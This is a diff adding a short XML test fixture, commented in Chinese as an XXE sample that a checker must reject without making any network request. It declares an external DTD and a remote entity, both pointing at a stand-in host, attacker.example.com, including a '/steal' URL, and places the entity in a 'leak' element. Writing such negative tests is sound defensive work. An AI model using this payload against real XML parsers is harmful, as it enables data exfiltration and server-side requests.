@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- XXE 样例：试图通过外部 DTD 与远程实体发起网络请求。
+     检查台必须拒绝，且整个检查过程不产生任何网络流量。 -->
+<!DOCTYPE data SYSTEM "http://attacker.example.com/evil.dtd" [
+  <!ENTITY remote SYSTEM "http://attacker.example.com/steal?x=1">
+]>
+<data>
+  <title>外部 DTD / 远程实体测试</title>
+  <leak>&remote;</leak>
+</data>
